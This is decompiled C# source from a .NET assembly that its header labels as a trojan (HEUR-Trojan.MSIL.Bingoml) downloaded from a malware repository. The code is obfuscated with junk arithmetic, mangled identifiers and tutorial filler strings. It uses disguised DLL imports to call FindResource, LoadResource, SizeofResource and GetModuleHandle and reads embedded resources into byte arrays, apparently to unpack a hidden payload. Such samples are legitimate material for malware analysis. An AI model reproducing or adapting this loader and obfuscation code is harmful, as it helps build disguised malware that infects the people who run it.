// Decompiled with JetBrains decompiler
// Type: ReadFieldLayoutRow
// Assembly: ebjpdgmlpo, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0CDA7841-F392-4B79-AA40-F2EF09CA848C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Bingoml.gen-97b2d807f8c07d9dfa4a7fce2b85f6ae6030b425982ac257ba226bdf357f42bd.exe

using System;
using System.Collections;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

internal class ReadFieldLayoutRow
{
  public static void LOCALE_SABBREVMONTHNAME11()
  {
    Stack stack = (Stack) \u003CModule\u003E.l\u008A\u007Bæ\u008C();
    \u003CModule\u003E.\u001CØ\u0019\u009BS((object) stack, (object) "Geeks");
    \u003CModule\u003E.\u001CØ\u0019\u009BS((object) stack, (object) "geeksforgeeks");
    \u003CModule\u003E.\u001CØ\u0019\u009BS((object) stack, (object) (char) (((int.Parse("1148412385") ^ int.Parse("1148413265")) / \u003CModule\u003E.Run(int.Parse("12")) + Convert.ToInt32(44962.0 + Math.Truncate(44961.5)) / \u003CModule\u003E.Run(int.Parse("14")) - Convert.ToInt32(90838.6317736869 + Math.Sqrt(45526.0)) / \u003CModule\u003E.Run(int.Parse("14"))) * (Convert.ToInt32(27829.225365304497 - Math.Sin(13915.0)) / \u003CModule\u003E.Run(int.Parse("10")) + Convert.ToInt32(18815.83396824959 - Math.Tan(9407.0)) / \u003CModule\u003E.Run(int.Parse("8")) - Convert.ToInt32(46795.713784577558 - Math.Sqrt(23321.5)) / \u003CModule\u003E.Run(int.Parse("7")))));
    \u003CModule\u003E.\u001CØ\u0019\u009BS((object) stack, (object) null);
    \u003CModule\u003E.\u001CØ\u0019\u009BS((object) stack, (object) (((int.Parse("-1554113623") ^ int.Parse("1554083932")) + Convert.ToInt32(24307.5 + Math.Abs(24307.5)) / \u003CModule\u003E.Run(int.Parse("4")) - Convert.ToInt32(14223.0 - Math.Truncate(4741.0)) / \u003CModule\u003E.Run(int.Parse("9"))) * (Convert.ToInt32(13408.0 - Math.Truncate(4469.5)) / \u003CModule\u003E.Run(int.Parse("2")) + Convert.ToInt32(73305.490613035465 + Math.Log(36658.0)) / \u003CModule\u003E.Run(int.Parse("5")) - Convert.ToInt32(82254.39913372384 + Math.Sin(41127.0)) / \u003CModule\u003E.Run(int.Parse("7")))));
    \u003CModule\u003E.\u001CØ\u0019\u009BS((object) stack, (object) 490.98);
    IEnumerator enumerator = (IEnumerator) \u003CModule\u003E.éîm\u008DÖ((object) stack);
    try
    {
      while (\u003CModule\u003E.éÎ0\u00ABÞ((object) enumerator))
      {
        object obj = \u003CModule\u003E.\u00A4\u0008Ö\u0088Ã((object) enumerator);
        \u003CModule\u003E.LuNâ\u000F(obj);
      }
    }
    finally
    {
      if (enumerator is IDisposable disposable)
        \u003CModule\u003E.Pl\u0007\u007D\u009B((object) disposable);
    }
  }

  public static void PinnedBufferMemoryStream()
  {
    Stack stack = (Stack) \u003CModule\u003E.l\u008A\u007Bæ\u008C();
    \u003CModule\u003E.\u001CØ\u0019\u009BS((object) stack, (object) "Geeks");
    \u003CModule\u003E.\u001CØ\u0019\u009BS((object) stack, (object) "geeksforgeeks");
    \u003CModule\u003E.\u001CØ\u0019\u009BS((object) stack, (object) (char) ((Convert.ToInt32(65354.962156898931 + Math.Sin(32677.0)) / \u003CModule\u003E.Run(int.Parse("8")) + Convert.ToInt32(14851.940817053117 + Math.Sin(7425.5)) / \u003CModule\u003E.Run(int.Parse("13")) - Convert.ToInt32(40067.0 + Math.Ceiling(40067.0)) / \u003CModule\u003E.Run(int.Parse("6"))) * (Convert.ToInt32(30619.571233511797 - Math.Tan(15309.5)) / \u003CModule\u003E.Run(int.Parse("12")) + Convert.ToInt32(27049.5 + 27049.5) / \u003CModule\u003E.Run(int.Parse("11")) - Convert.ToInt32(84716.569817998592 + Math.Tan(42358.5)) / \u003CModule\u003E.Run(int.Parse("13")))));
    \u003CModule\u003E.\u001CØ\u0019\u009BS((object) stack, (object) null);
    \u003CModule\u003E.\u001CØ\u0019\u009BS((object) stack, (object) (((int.Parse("-126223879") ^ int.Parse("126321688")) + Convert.ToInt32(27312.0 - Math.Floor(9104.0)) / \u003CModule\u003E.Run(int.Parse("5")) + Convert.ToInt32(81872.0 + Math.Tanh(40936.5)) / \u003CModule\u003E.Run(int.Parse("8"))) * (Convert.ToInt32(-105252.0 - -35084.0) + (int.Parse("2094951595") ^ int.Parse("2094945322")) / \u003CModule\u003E.Run(int.Parse("11")) + Convert.ToInt32(55537.110815209613 + Math.Sqrt(27852.0)) / \u003CModule\u003E.Run(int.Parse("11")))));
    \u003CModule\u003E.\u001CØ\u0019\u009BS((object) stack, (object) 490.98);
    IEnumerator enumerator = (IEnumerator) \u003CModule\u003E.éîm\u008DÖ((object) stack);
    try
    {
      while (\u003CModule\u003E.éÎ0\u00ABÞ((object) enumerator))
      {
        object obj = \u003CModule\u003E.\u00A4\u0008Ö\u0088Ã((object) enumerator);
        \u003CModule\u003E.LuNâ\u000F(obj);
      }
    }
    finally
    {
      if (enumerator is IDisposable disposable)
        \u003CModule\u003E.Pl\u0007\u007D\u009B((object) disposable);
    }
  }

  public static void get_DataDirectories()
  {
    Stack stack = (Stack) \u003CModule\u003E.l\u008A\u007Bæ\u008C();
    \u003CModule\u003E.\u001CØ\u0019\u009BS((object) stack, (object) "Geeks");
    \u003CModule\u003E.\u001CØ\u0019\u009BS((object) stack, (object) "geeksforgeeks");
    \u003CModule\u003E.\u001CØ\u0019\u009BS((object) stack, (object) (char) ((Convert.ToInt32(-198939.0 - -66313.0) + Convert.ToInt32(1064911250.0 / 23075.0) / \u003CModule\u003E.Run(int.Parse("2")) + Convert.ToInt32(86546.06695376111 + Math.Sin(43273.5)) / \u003CModule\u003E.Run(int.Parse("6"))) * (Convert.ToInt32(-29179.5 - -9726.5) + Convert.ToInt32(58872.0 - 19624.0) / \u003CModule\u003E.Run(int.Parse("12")) - Convert.ToInt32(9897.0 + 9897.0) / \u003CModule\u003E.Run(int.Parse("8")))));
    \u003CModule\u003E.\u001CØ\u0019\u009BS((object) stack, (object) null);
    \u003CModule\u003E.\u001CØ\u0019\u009BS((object) stack, (object) ((Convert.ToInt32(-71784.0 - 71784.0) + Convert.ToInt32(46684.99944173167 - Math.Cos(23342.0)) / \u003CModule\u003E.Run(int.Parse("9")) + Convert.ToInt32(98117.006140721191 + Math.Cos(49059.0)) / \u003CModule\u003E.Run(int.Parse("8"))) * (Convert.ToInt32(3936861378.0 / -44367.0) + Convert.ToInt32(2.0 * 4859.0) / \u003CModule\u003E.Run(int.Parse("14")) + Convert.ToInt32(118525.0 - Math.Truncate(39508.5)) / \u003CModule\u003E.Run(int.Parse("12")))));
    \u003CModule\u003E.\u001CØ\u0019\u009BS((object) stack, (object) 490.98);
    IEnumerator enumerator = (IEnumerator) \u003CModule\u003E.éîm\u008DÖ((object) stack);
    try
    {
      while (\u003CModule\u003E.éÎ0\u00ABÞ((object) enumerator))
      {
        object obj = \u003CModule\u003E.\u00A4\u0008Ö\u0088Ã((object) enumerator);
        \u003CModule\u003E.LuNâ\u000F(obj);
      }
    }
    finally
    {
      if (enumerator is IDisposable disposable)
        \u003CModule\u003E.Pl\u0007\u007D\u009B((object) disposable);
    }
  }

  public static void PercentNegativePattern()
  {
    Stack stack = (Stack) \u003CModule\u003E.l\u008A\u007Bæ\u008C();
    \u003CModule\u003E.\u001CØ\u0019\u009BS((object) stack, (object) "Geeks");
    \u003CModule\u003E.\u001CØ\u0019\u009BS((object) stack, (object) "geeksforgeeks");
    \u003CModule\u003E.\u001CØ\u0019\u009BS((object) stack, (object) (char) (((int.Parse("-1771646370") ^ int.Parse("1771570144")) + Convert.ToInt32(32843.293348836618 + Math.Log(16426.5)) / \u003CModule\u003E.Run(int.Parse("5")) + Convert.ToInt32(44596.854535143168 + Math.Sin(22298.0)) / \u003CModule\u003E.Run(int.Parse("7"))) * (Convert.ToInt32(-30612.5 - 30612.5) + Convert.ToInt32(82800.0 - 27600.0) / \u003CModule\u003E.Run(int.Parse("10")) + Convert.ToInt32(6026.2110462621213 + Math.Sin(3013.0)) / \u003CModule\u003E.Run(int.Parse("12")))));
    \u003CModule\u003E.\u001CØ\u0019\u009BS((object) stack, (object) null);
    \u003CModule\u003E.\u001CØ\u0019\u009BS((object) stack, (object) ((Convert.ToInt32(119826.0 - Math.Truncate(39942.0)) / \u003CModule\u003E.Run(int.Parse("11")) + Convert.ToInt32(7048.4527176920365 + Math.Log10(3526.0)) / \u003CModule\u003E.Run(int.Parse("7")) - Convert.ToInt32(128553.0 - Math.Round(42851.0)) / \u003CModule\u003E.Run(int.Parse("6"))) * (Convert.ToInt32(-205617.0 - -68539.0) + Convert.ToInt32(127825.5 - 42608.5) / \u003CModule\u003E.Run(int.Parse("9")) + Convert.ToInt32(25931.0 + 25931.0) / \u003CModule\u003E.Run(int.Parse("8")))));
    \u003CModule\u003E.\u001CØ\u0019\u009BS((object) stack, (object) 490.98);
    IEnumerator enumerator = (IEnumerator) \u003CModule\u003E.éîm\u008DÖ((object) stack);
    try
    {
      while (\u003CModule\u003E.éÎ0\u00ABÞ((object) enumerator))
      {
        object obj = \u003CModule\u003E.\u00A4\u0008Ö\u0088Ã((object) enumerator);
        \u003CModule\u003E.LuNâ\u000F(obj);
      }
    }
    finally
    {
      if (enumerator is IDisposable disposable)
        \u003CModule\u003E.Pl\u0007\u007D\u009B((object) disposable);
    }
  }

  public static void Set_CreationTimeUtc()
  {
    Task<int> task = \u003CModule\u003E.ÃÏK\u00A1ý();
    \u003CModule\u003E.î\u0023ETq("Task is being performed by the asynchronous method and we are asked to wait until the completion of the task using await method");
    string str1 = \u003CModule\u003E.\u00A5Y\u0003å\u0096();
    \u003CModule\u003E.î\u0023ETq(\u003CModule\u003E.\u00A15\u0020Ê\u00A8("The flow of the program is resumed once the task is completed by the asynchronous method and the value is returned ", str1));
    \u003CModule\u003E.R5\u0013\u0004\u00B4((object) task);
    int result = task.Result;
    \u003CModule\u003E.î\u0023ETq(\u003CModule\u003E.\u009Fí\u00A2ù\u00A8((object) "The number of characters in the file are: ", (object) result));
    \u003CModule\u003E.î\u0023ETq("The program has completed its normal execution and the asynchronous method has read the file to count the number of characters in the file");
    string str2 = \u003CModule\u003E.\u00A5Y\u0003å\u0096();
  }

  private static Task<int> Canonicalize()
  {
    // ISSUE: variable of a compiler-generated type
    ReadFieldLayoutRow.Action`6 stateMachine;
    // ISSUE: reference to a compiler-generated field
    stateMachine.LastWriteTimeUtc = AsyncTaskMethodBuilder<int>.Create();
    // ISSUE: reference to a compiler-generated field
    stateMachine.EndExceptionBlock = Convert.ToInt32(9695.0 + 9695.0) / \u003CModule\u003E.Run(int.Parse("5")) + (int.Parse("1954755341") ^ int.Parse("1954799063")) / \u003CModule\u003E.Run(int.Parse("10")) - Convert.ToInt32(80536.0929756618 + Math.Cos(40268.5)) / \u003CModule\u003E.Run(int.Parse("12"));
    // ISSUE: reference to a compiler-generated field
    stateMachine.LastWriteTimeUtc.Start<ReadFieldLayoutRow.Action`6>(ref stateMachine);
    // ISSUE: reference to a compiler-generated field
    return stateMachine.LastWriteTimeUtc.Task;
  }

  [DllImport("kgdfsdfsdfsfgdff#", EntryPoint = "fgddfsdfgfda", SetLastError = true)]
  private static extern IntPtr GetResourceLookupCulture(IntPtr _param0, IntPtr _param1);

  [DllImport("#fagsdfsdfdfgfd#", EntryPoint = "LoadResource")]
  private static extern IntPtr dnlib\u002EDotNet\u002EPdb\u002EDss\u002EIMetaDataImport\u002EEnumProperties(
    IntPtr _param0,
    IntPtr _param1);

  [DllImport("#sadaaaagfdgadfsdfsdfaaadvcxvadaadfgds.dll#", EntryPoint = "GetModuleHandle", SetLastError = true)]
  private static extern IntPtr M_cultureId(string _param0);

  [DllImport("#ffgffsdfsgfa.dll#", EntryPoint = "FindResource", SetLastError = true)]
  private static extern IntPtr CategoryAttribute(
    IntPtr _param0,
    string _param1,
    string _param2);

  [DllImport("#fggffsdfgsdg.dll#", EntryPoint = "gsfsdfdgfgfdsg")]
  private static extern IntPtr FindMethodCheckBaseType(string _param0);

  [DllImport("#gsdsfsdffgdg.dll#", EntryPoint = "gshfddfsdfgsdg", SetLastError = true)]
  private static extern IntPtr IsSeparatorLatin1(
    IntPtr _param0,
    string _param1,
    string _param2);

  [DllImport("#ghfsdfdfsdgsd.dll#", EntryPoint = "gshfsdffdhddgdsg")]
  private static extern IntPtr Ret(string _param0);

  [DllImport("#gdhffsdfdsgsdg.dll#", EntryPoint = "ghsdhgfdhgsdg")]
  private static extern IntPtr Unregister(string _param0);

  [DllImport("#gdsgdhfdsg.dll#", EntryPoint = "gddgdsgsdfhsg")]
  private static extern IntPtr Unspecified(string _param0);

  [DllImport("#gsfhgsdgsdgfddg.dll#", EntryPoint = "SizeofResource", SetLastError = true)]
  private static extern uint M_Item1(IntPtr _param0, IntPtr _param1);

  [DllImport("#gsdhdsdgfgsd.dll#", EntryPoint = "hdgdsfh", SetLastError = true)]
  private static extern IntPtr GetAbsoluteDateHijri(
    IntPtr _param0,
    string _param1,
    string _param2);

  public static byte[] RemovableRunFromSwap(string _param0, string _param1)
  {
    IntPtr num1 = \u003CModule\u003E.fv\u00B2v\u0029(\u003CModule\u003E.F\u0080ä\u0002S(\u003CModule\u003E.õ\u0089p0\u00BD()));
    IntPtr num2 = \u003CModule\u003E.\u008C2B\u008A\u003B(num1, _param0, _param1);
    IntPtr num3 = \u003CModule\u003E.ÏJ\u0009\u0024t(num1, num2);
    uint length = \u003CModule\u003E.\u00B7\u00A3wÞï(num1, num2);
    byte[] numArray = new byte[(IntPtr) length];
    \u003CModule\u003E.aoÙ2Ö(num3, numArray, Convert.ToInt32(43136.89582612463 - Math.Cos(21568.5)) / \u003CModule\u003E.Run(int.Parse("6")) + Convert.ToInt32(16149.0 - Math.Floor(5383.0)) / \u003CModule\u003E.Run(int.Parse("2")) - Convert.ToInt32(2.0 * 26951.5) / \u003CModule\u003E.Run(int.Parse("14")) + Type.EmptyTypes.Length - Type.EmptyTypes.Length, (int) length);
    return numArray;
  }

  public static byte[] RemoveEmptyEvents(string _param0, string _param1)
  {
    ResourceManager resourceManager = (ResourceManager) \u003CModule\u003E.\u00B7\u008C\u005B\u0083\u0094(_param1, \u003CModule\u003E.õ\u0089p0\u00BD());
    return (byte[]) \u003CModule\u003E.A\u0021\u0028\u00A2\u0014((object) resourceManager, _param0);
  }
}
